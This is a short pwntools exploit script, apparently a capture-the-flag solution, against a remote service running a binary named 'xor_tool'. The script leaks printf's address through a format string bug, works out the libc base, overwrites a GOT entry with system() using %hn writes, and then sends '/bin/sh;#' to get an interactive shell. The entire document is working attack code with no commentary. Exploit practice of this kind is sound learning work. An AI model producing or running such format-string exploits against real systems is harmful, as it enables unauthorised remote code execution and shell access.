from pwn import *

#s = process("./xor_tool")
#libc = ELF("libc.so.6")
s = remote("139.59.61.220", 32345)
libc = ELF("libc-2.23.so")

s.recvuntil("***********************************************************************")

s.recvuntil(":")
s.sendline("2")
s.recvuntil(":")
s.sendline("\x00")
s.recvuntil(":")
addr = 0x804A010
s.sendline("AA"+p32(addr)+"%11$s")

s.recvuntil("msg :AA")
s.recv(4)
buf = s.recvline()

printf_addr= u32(buf[:4])


s.recvuntil(":")
s.sendline("2")
s.recvuntil(":")
s.sendline("\x00")
s.recvuntil(":")

libc.address = printf_addr - libc.symbols['printf']

add1 = 0x804a028
add2 = 0x804a02a

sys1 = libc.symbols['system'] & 0xffff
sys2 = libc.symbols['system'] >> 16
print hex(libc.symbols['system'])
print hex(printf_addr)
s.sendline("AA"+p32(add1)+p32(add2)+("%%.%du"%(sys1-0xa)) + "%11$hn" + ("%%.%du"%(sys2-sys1))+"%12$hn")

s.clean()

s.sendline("2")
s.recvuntil(":")
s.sendline("\x00")
s.recvuntil(":")
s.sendline("/bin/sh;#")
s.interactive()
